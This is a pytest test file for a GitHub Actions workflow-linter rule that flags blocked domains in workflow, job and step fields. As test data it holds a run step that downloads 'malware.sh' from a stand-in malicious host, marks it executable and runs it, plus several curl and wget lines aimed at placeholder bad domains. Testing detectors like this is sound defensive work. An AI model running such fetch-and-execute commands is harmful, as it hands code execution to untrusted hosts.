"""Test src/bitwarden_workflow_linter/rules/check_blocked_domains.py."""

import pytest
from ruamel.yaml import YAML

from src.bitwarden_workflow_linter.load import WorkflowBuilder
from src.bitwarden_workflow_linter.models.job import Job
from src.bitwarden_workflow_linter.models.step import Step
from src.bitwarden_workflow_linter.models.workflow import Workflow
from src.bitwarden_workflow_linter.rules.check_blocked_domains import RuleCheckBlockedDomains
from src.bitwarden_workflow_linter.utils import Settings, LintLevels

yaml = YAML()


@pytest.fixture(name="settings")
def fixture_settings():
    return Settings(
        blocked_domains=[
            'malicious-example.com',
            'suspicious-domain.org',
            'untrusted-repo.net',
            'bad-actor.io'
        ]
    )


@pytest.fixture(name="rule")
def fixture_rule(settings):
    return RuleCheckBlockedDomains(settings=settings)


class TestRuleCheckBlockedDomains:
    """Test the RuleCheckBlockedDomains rule."""

    def test_extract_domains_from_text(self, rule):
        """Test domain extraction from various text formats."""
        test_cases = [
            ("https://example.com/path", ["example.com"]),
            ("http://www.test.org", ["test.org"]),
            ("Visit malicious-example.com for info", ["malicious-example.com"]),
            ("Download from https://suspicious-domain.org/file.zip", ["suspicious-domain.org"]),
            ("No domains here", []),
            ("", []),
            ("Multiple: example.com and test.org", ["example.com", "test.org"]),
        ]
        
        for text, expected in test_cases:
            domains = rule.extract_domains_from_text(text)
            # Sort both lists for comparison since order doesn't matter
            assert sorted(domains) == sorted(expected), f"Failed for text: '{text}'"

    def test_check_blocked_domains_clean_text(self, rule):
        """Test checking text with no blocked domains."""
        clean_texts = [
            "https://github.com/bitwarden/workflow-linter",
            "Download from npm registry",
            "Visit our documentation at docs.bitwarden.com",
            ""
        ]
        
        for text in clean_texts:
            is_clean, blocked = rule.check_blocked_domains(text)
            assert is_clean, f"Text should be clean: '{text}'"
            assert len(blocked) == 0

    def test_check_blocked_domains_with_blocked(self, rule):
        """Test checking text with blocked domains."""
        blocked_texts = [
            ("https://malicious-example.com/download", ["malicious-example.com"]),
            ("Visit suspicious-domain.org", ["suspicious-domain.org"]),
            ("curl https://untrusted-repo.net/script.sh", ["untrusted-repo.net"]),
            ("Multiple: malicious-example.com and suspicious-domain.org", 
             ["malicious-example.com", "suspicious-domain.org"])
        ]
        
        for text, expected_domains in blocked_texts:
            is_clean, blocked = rule.check_blocked_domains(text)
            assert not is_clean, f"Text should not be clean: '{text}'"
            assert len(blocked) > 0
            # Check that all expected domains are found
            for domain in expected_domains:
                assert domain in blocked, f"Expected domain '{domain}' not found in {blocked}"

    def test_workflow_level_check_clean(self, rule):
        """Test workflow-level checking with clean content."""
        workflow_yaml = """
        name: Clean Workflow
        on:
          push:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - name: Checkout
                uses: actions/checkout@v4
        """
        
        workflow_data = yaml.load(workflow_yaml)
        workflow = Workflow.init("", "test.yml", workflow_data)
        
        success, message = rule.fn(workflow)
        assert success, f"Workflow should pass: {message}"

    def test_workflow_level_check_blocked(self, rule):
        """Test workflow-level checking with blocked domain."""
        workflow_yaml = """
        name: Download from malicious-example.com
        on:
          push:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - name: Test
                run: echo "test"
        """
        
        workflow_data = yaml.load(workflow_yaml)
        workflow = Workflow.init("", "test.yml", workflow_data)
        
        success, message = rule.fn(workflow)
        assert not success, "Workflow should fail due to blocked domain"
        assert "malicious-example.com" in message
        assert "workflow name" in message

    def test_job_level_check_clean(self, rule):
        """Test job-level checking with clean content."""
        job_data = yaml.load("""
        name: Clean Job
        runs-on: ubuntu-latest
        env:
          API_URL: https://api.github.com
        steps:
          - name: Test
            run: echo "test"
        """)
        
        job = Job.init("test-job", job_data)
        
        success, message = rule.fn(job)
        assert success, f"Job should pass: {message}"

    def test_job_level_check_blocked_in_name(self, rule):
        """Test job-level checking with blocked domain in name."""
        job_data = yaml.load("""
        name: Download from suspicious-domain.org
        runs-on: ubuntu-latest
        steps:
          - name: Test
            run: echo "test"
        """)
        
        job = Job.init("test-job", job_data)
        
        success, message = rule.fn(job)
        assert not success, "Job should fail due to blocked domain in name"
        assert "suspicious-domain.org" in message
        assert "job name" in message

    def test_job_level_check_blocked_in_uses(self, rule):
        """Test job-level checking with blocked domain in uses."""
        job_data = yaml.load("""
        uses: malicious-example.com/action@v1
        """)
        
        job = Job.init("test-job", job_data)
        
        success, message = rule.fn(job)
        assert not success, "Job should fail due to blocked domain in uses"
        assert "malicious-example.com" in message
        assert "job uses" in message

    def test_job_level_check_blocked_in_env(self, rule):
        """Test job-level checking with blocked domain in environment variable."""
        job_data = yaml.load("""
        name: Test Job
        runs-on: ubuntu-latest
        env:
          DOWNLOAD_URL: https://untrusted-repo.net/file.zip
        steps:
          - name: Test
            run: echo "test"
        """)
        
        job = Job.init("test-job", job_data)
        
        success, message = rule.fn(job)
        assert not success, "Job should fail due to blocked domain in env"
        assert "untrusted-repo.net" in message
        assert "job env 'DOWNLOAD_URL'" in message

    def test_step_level_check_clean(self, rule):
        """Test step-level checking with clean content."""
        step_data = yaml.load("""
        name: Checkout code
        uses: actions/checkout@v4
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = rule.fn(step)
        assert success, f"Step should pass: {message}"

    def test_step_level_check_blocked_in_uses(self, rule):
        """Test step-level checking with blocked domain in uses."""
        step_data = yaml.load("""
        name: Download malicious action
        uses: malicious-example.com/action@v1
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = rule.fn(step)
        assert not success, "Step should fail due to blocked domain in uses"
        assert "malicious-example.com" in message
        assert "step uses" in message

    def test_step_level_check_blocked_in_run(self, rule):
        """Test step-level checking with blocked domain in run command."""
        step_data = yaml.load("""
        name: Download script
        run: |
          curl -o script.sh https://suspicious-domain.org/malware.sh
          chmod +x script.sh
          ./script.sh
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = rule.fn(step)
        assert not success, "Step should fail due to blocked domain in run"
        assert "suspicious-domain.org" in message
        assert "step run command" in message

    def test_step_level_check_blocked_in_with(self, rule):
        """Test step-level checking with blocked domain in with parameters."""
        step_data = yaml.load("""
        name: Configure action
        uses: some/action@v1
        with:
          config_url: https://untrusted-repo.net/config.json
          backup_url: https://malicious-example.com/backup
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = rule.fn(step)
        assert not success, "Step should fail due to blocked domains in with"
        assert ("untrusted-repo.net" in message or "malicious-example.com" in message)
        assert ("step with" in message)

    def test_step_level_check_blocked_in_env(self, rule):
        """Test step-level checking with blocked domain in environment variable."""
        step_data = yaml.load("""
        name: Test step with env
        run: echo "Testing"
        env:
          API_ENDPOINT: https://bad-actor.io/api
          BACKUP_URL: untrusted-repo.net/backup
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = rule.fn(step)
        assert not success, "Step should fail due to blocked domain in env"
        assert ("bad-actor.io" in message or "untrusted-repo.net" in message)
        assert "step env" in message

    def test_multiple_blocked_domains_in_single_step(self, rule):
        """Test step with multiple blocked domains."""
        step_data = yaml.load("""
        name: Multiple blocked domains
        run: |
          curl https://malicious-example.com/file1
          wget https://suspicious-domain.org/file2
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = rule.fn(step)
        assert not success, "Step should fail due to multiple blocked domains"
        assert "malicious-example.com" in message
        assert "suspicious-domain.org" in message

    def test_rule_with_custom_blocked_domains(self):
        """Test rule with custom blocked domains list."""
        custom_settings = Settings(
            blocked_domains=['custom-bad.com', 'another-threat.net']
        )
        custom_rule = RuleCheckBlockedDomains(settings=custom_settings)
        
        step_data = yaml.load("""
        name: Test custom domains
        run: curl https://custom-bad.com/script.sh
        """)
        
        step = Step.init(0, "test-job", step_data)
        
        success, message = custom_rule.fn(step)
        assert not success, "Step should fail with custom blocked domain"
        assert "custom-bad.com" in message

    def test_rule_compatibility(self, rule):
        """Test that rule is compatible with all object types."""
        assert Workflow in rule.compatibility
        assert Job in rule.compatibility  
        assert Step in rule.compatibility

    def test_rule_lint_level_configuration(self, settings):
        """Test rule with different lint levels."""
        error_rule = RuleCheckBlockedDomains(settings=settings, lint_level=LintLevels.ERROR)
        warning_rule = RuleCheckBlockedDomains(settings=settings, lint_level=LintLevels.WARNING)
        
        assert error_rule.on_fail == LintLevels.ERROR
        assert warning_rule.on_fail == LintLevels.WARNING
